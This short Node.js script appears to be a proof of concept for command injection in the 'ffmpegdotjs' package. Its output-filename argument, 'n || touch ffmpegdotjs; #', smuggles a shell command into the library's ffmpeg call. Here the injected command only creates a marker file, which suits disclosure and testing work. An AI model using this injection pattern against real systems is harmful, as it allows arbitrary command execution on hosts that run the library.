const ffmpegdotjs = require("ffmpegdotjs");
try {
  ffmpegdotjs.trimvideo("package-lock.json", 0, 30, "n || touch ffmpegdotjs; #");
} catch (err) {}
